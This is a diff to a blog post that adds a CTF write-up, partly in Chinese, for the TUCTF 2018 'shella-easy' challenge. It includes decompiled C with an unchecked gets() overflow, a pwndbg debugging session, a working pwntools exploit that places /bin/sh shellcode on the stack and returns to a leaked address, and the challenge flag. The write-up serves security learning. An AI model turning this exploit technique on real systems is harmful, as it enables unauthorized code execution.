@@ -1,7 +1,7 @@
 ---
 title: 'Writeups: Nightmare Series'
 date: '2024-07-24'
-lastmod: '2024-07-30'
+lastmod: '2024-07-31'
 tags: ['CTF','Writeup', 'Pwn', 'Nightmare']
 draft: false
 summary: 'Writeups for Nightmare Series'
@@ -1209,4 +1209,218 @@ interactive()
 ### Flag
 
 Flag: `gigem{r3m073_fl46_3x3cu710n}`
+
+## TUCTF 2018 shella-easy
+
+### Information
+
+ - Category: Pwn
+ - Points: 345
+
+### Description
+
+> Want to be a drive-thru attendant? Well, no one does… But! the best employee receives their very own flag! whatdya say?
+
+<Download name="shella-easy" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/06-bof_shellcode/tu18_shellaeasy/shella-easy" type="Binary" />
+
+### Writeup
+
+```plain-text
+λ ~/ file shella-easy
+shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
+λ ~/ pwn checksec shella-easy
+[*] '/home/cub3y0nd/shella-easy'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      No PIE (0x8048000)
+    Stack:    Executable
+    RWX:      Has RWX segments
+```
+
+```plain-text
+λ ~/ ./shella-easy
+Yeah I'll have a 0xffe6f1b0 with a side of fries thanks
+no way
+```
+
+伪代码：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s[64]; // [esp+0h] [ebp-48h] BYREF
+  int v5; // [esp+40h] [ebp-8h]
+
+  setvbuf(stdout, 0, 2, 0x14u);
+  setvbuf(stdin, 0, 2, 0x14u);
+  v5 = 0xCAFEBABE;
+  printf("Yeah I'll have a %p with a side of fries thanks\n", s);
+  gets(s);
+  if ( v5 != 0xDEADBEEF )
+    exit(0);
+  return 0;
+}
+```
+
+一眼出：溢出 `s`，覆盖返回地址到 `s` 中保存的 shellcode，并且覆盖 `v5` 为 `0xDEADBEEF` 以让程序正常返回。
+
+溢出 `s` 并覆盖 `v5` 很简单，我们看看怎么覆盖返回地址：
+
+```plain-text
+Breakpoint 1 at 0x804855a
+Breakpoint 2 at 0x8048541
+
+Breakpoint 2, 0x08048541 in main ()
+------- tip of the day (disable with set show-tips off) -------
+Use GDB's pi command to run an interactive Python console where you can use Pwndbg APIs like pwndbg.gdblib.memory.read(addr, len), pwndbg.gdblib.memory.write(addr, data), pwndbg.gdb.vmmap.get() and so on!
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
+*EAX  0xff8d7200 ◂— 0x2f68686a ('jhh/')
+*EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f0c (_DYNAMIC) ◂— 0x1
+*ECX  0xf67138ac ◂— 0x0
+*EDX  0x0
+*EDI  0xf677bb60 (_rtld_global_ro) ◂— 0x0
+*ESI  0x8048560 (__libc_csu_init) ◂— push ebp
+*EBP  0xff8d7248 ◂— 0x0
+*ESP  0xff8d7200 ◂— 0x2f68686a ('jhh/')
+*EIP  0x8048541 (main+102) ◂— cmp dword ptr [ebp - 8], 0deadbeefh
+────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
+ ► 0x8048541  <main+102>    cmp    dword ptr [ebp - 8], 0deadbeefh
+   0x8048548  <main+109>    je     8048551h                      <main+118>
+    ↓
+   0x8048551  <main+118>    mov    eax, 0
+   0x8048556  <main+123>    mov    ebx, dword ptr [ebp - 4]
+   0x8048559  <main+126>    leave
+   0x804855a  <main+127>    ret
+    ↓
+   0xf6503bd7               add    esp, 10h
+   0xf6503bda               sub    esp, 0ch
+   0xf6503bdd               push   eax
+   0xf6503bde               call   0f651e590h                    <exit>
+
+   0xf6503be3               call   0f6570d20h                    <0xf6570d20>
+────────────────────────────────────[ STACK ]─────────────────────────────────────
+00:0000│ eax esp 0xff8d7200 ◂— 0x2f68686a ('jhh/')
+01:0004│-044     0xff8d7204 ◂— 0x68732f2f ('//sh')
+02:0008│-040     0xff8d7208 ◂— 0x6e69622f ('/bin')
+03:000c│-03c     0xff8d720c ◂— 0x168e389
+04:0010│-038     0xff8d7210 ◂— 0x81010101
+05:0014│-034     0xff8d7214 ◂— 0x69722434 ('4$ri')
+06:0018│-030     0xff8d7218 ◂— 0xc9310101
+07:001c│-02c     0xff8d721c ◂— 0x59046a51
+──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
+ ► 0 0x8048541 main+102
+   1 0xf6503bd7
+   2 0xf6503c9d __libc_start_main+141
+   3 0x8048401 _start+33
+──────────────────────────────────────────────────────────────────────────────────
+pwndbg> stack 20
+00:0000│ eax esp 0xff8d7200 ◂— 0x2f68686a ('jhh/')
+01:0004│-044     0xff8d7204 ◂— 0x68732f2f ('//sh')
+02:0008│-040     0xff8d7208 ◂— 0x6e69622f ('/bin')
+03:000c│-03c     0xff8d720c ◂— 0x168e389
+04:0010│-038     0xff8d7210 ◂— 0x81010101
+05:0014│-034     0xff8d7214 ◂— 0x69722434 ('4$ri')
+06:0018│-030     0xff8d7218 ◂— 0xc9310101
+07:001c│-02c     0xff8d721c ◂— 0x59046a51
+08:0020│-028     0xff8d7220 ◂— 0x8951e101
+09:0024│-024     0xff8d7224 ◂— 0x6ad231e1
+0a:0028│-020     0xff8d7228 ◂— 0x80cd580b
+0b:002c│-01c     0xff8d722c ◂— 0x41414141 ('AAAA')
+... ↓            4 skipped
+10:0040│-008     0xff8d7240 ◂— 0xdeadbeef
+11:0044│-004     0xff8d7244 —▸ 0xff8d7200 ◂— 0x2f68686a ('jhh/')
+12:0048│ ebp     0xff8d7248 ◂— 0x0
+13:004c│+004     0xff8d724c —▸ 0xf6503bd7 ◂— add esp, 10h
+pwndbg> c
+Continuing.
+
+Breakpoint 1, 0x0804855a in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
+*EAX  0x0
+*EBX  0xff8d7200 ◂— 0x2f68686a ('jhh/')
+ ECX  0xf67138ac ◂— 0x0
+ EDX  0x0
+ EDI  0xf677bb60 (_rtld_global_ro) ◂— 0x0
+ ESI  0x8048560 (__libc_csu_init) ◂— push ebp
+*EBP  0x0
+*ESP  0xff8d724c —▸ 0xf6503bd7 ◂— add esp, 10h
+*EIP  0x804855a (main+127) ◂— ret
+────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
+   0x8048551  <main+118>    mov    eax, 0
+   0x8048556  <main+123>    mov    ebx, dword ptr [ebp - 4]
+   0x8048559  <main+126>    leave
+ ► 0x804855a  <main+127>    ret    <0xf6503bd7>
+    ↓
+   0xf6503bd7               add    esp, 10h
+   0xf6503bda               sub    esp, 0ch
+   0xf6503bdd               push   eax
+   0xf6503bde               call   0f651e590h                    <exit>
+
+   0xf6503be3               call   0f6570d20h                    <0xf6570d20>
+
+   0xf6503be8               mov    eax, dword ptr [esp]
+   0xf6503beb               lock sub dword ptr [eax + 290h], 1
+────────────────────────────────────[ STACK ]─────────────────────────────────────
+00:0000│ esp 0xff8d724c —▸ 0xf6503bd7 ◂— add esp, 10h
+01:0004│     0xff8d7250 ◂— 0x1
+02:0008│     0xff8d7254 —▸ 0xff8d7304 —▸ 0xff8d87c6 ◂— './shella-easy'
+03:000c│     0xff8d7258 —▸ 0xff8d730c —▸ 0xff8d87d4 ◂— 'MOTD_SHOWN=pam'
+04:0010│     0xff8d725c —▸ 0xff8d7270 —▸ 0xf6711e2c ◂— 0x22ed4c
+05:0014│     0xff8d7260 —▸ 0xf6711e2c ◂— 0x22ed4c
+06:0018│     0xff8d7264 —▸ 0x80484db (main) ◂— push ebp
+07:001c│     0xff8d7268 ◂— 0x1
+──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
+ ► 0 0x804855a main+127
+   1 0xf6503bd7
+   2 0xf6503c9d __libc_start_main+141
+   3 0x8048401 _start+33
+──────────────────────────────────────────────────────────────────────────────────
+pwndbg> i frame
+Stack level 0, frame at 0xff8d7250:
+ eip = 0x804855a in main; saved eip = 0xf6503bd7
+ called by frame at 0xff8d72b0
+ Arglist at unknown address.
+ Locals at unknown address, Previous frame's sp is 0xff8d7250
+ Saved registers:
+  eip at 0xff8d724c
+pwndbg> hex(0xff8d724c-0xff8d7240)
++0000 0x00000c
+```
+
+由此可知，`0xc` 是我们 `ret` 和 `0xdeadbeef` 之间的距离，因为是 i386，所以我们减四就是偏移量了。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+context(os='linux', arch='i386', log_level='debug', terminal='kitty')
+
+target = process('./shella-easy')
+
+recvline    = lambda : target.recvline()
+recvuntil   = lambda str : target.recvuntil(str)
+sendline    = lambda str : target.sendline(str)
+interactive = lambda : target.interactive()
+
+recvuntil(b'a ')
+
+leak_addr = p32(int(recvuntil(b' ').strip(b' '), 16))
+
+shellcode = asm(shellcraft.sh())
+payload = shellcode + b'A' * (64 - len(shellcode)) + p32(0xdeadbeef) + b'B' * 0x8 + leak_addr
+
+sendline(payload)
+interactive()
+```
+
+### Flag
+
+Flag: `TUCTF{1_607_4_fl46_bu7_n0_fr135}`
 
